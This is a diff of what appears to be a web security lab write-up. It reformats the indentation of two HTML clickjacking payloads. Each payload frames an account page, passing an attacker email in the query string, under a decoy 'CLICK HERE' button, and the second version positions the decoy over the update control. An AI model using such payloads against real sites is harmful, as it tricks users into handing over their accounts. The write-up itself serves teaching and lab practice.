@@ -8,26 +8,26 @@ Upon logging in with the given credentials, we notice that after going to the ac
 
 ```jsx
 <head>
-	<style>
-		iframe {
-			position:relative;
-			width:700px;
-			height:600px;
-			opacity:0.1;
-			z-index:2;
-			}
-		div {
-			position:absolute;
-			z-index:1;
-			}
-	</style>
+   <style>
+      iframe {
+       position:relative;
+       width:700px;
+       height:600px;
+       opacity:0.1;
+       z-index:2;
+      }
+      div {
+       position:absolute;
+       z-index:1;
+      }
+   </style>
 </head>
 <body>
-	<div>
-		CLICK HERE
-	</div>
-	<iframe src="${LAB_ACCOUNT_ROUTE_URL}?email=attacker@email.com">
-	</iframe>
+   <div>
+      CLICK HERE
+   </div>
+   <iframe src="${LAB_ACCOUNT_ROUTE_URL}?email=attacker@email.com">
+   </iframe>
 </body>
 ```
 
@@ -39,28 +39,28 @@ We need to modify the location of the `CLICK ME` div tag so that it is on top of
 
 ```jsx
 <head>
-	<style>
-		iframe {
-			position:relative;
-			width:700px;
-			height:600px;
-			opacity:0.1;
-			z-index:2;
-			}
-		div {
-			position:absolute;
-			z-index:1;
-			top:450px;
-			left:50px;
-			}
-	</style>
+   <style>
+      iframe {
+       position:relative;
+       width:700px;
+       height:600px;
+       opacity:0.1;
+       z-index:2;
+      }
+      div {
+       position:absolute;
+       z-index:1;
+       top:450px;
+       left:50px;
+      }
+   </style>
 </head>
 <body>
-	<div>
-		CLICK HERE
-	</div>
-	<iframe src="${LAB_ACCOUNT_ROUTE_URL}?email=attacker@email.com">
-	</iframe>
+   <div>
+      CLICK HERE
+   </div>
+   <iframe src="${LAB_ACCOUNT_ROUTE_URL}?email=attacker@email.com">
+   </iframe>
 </body>
 ```
 
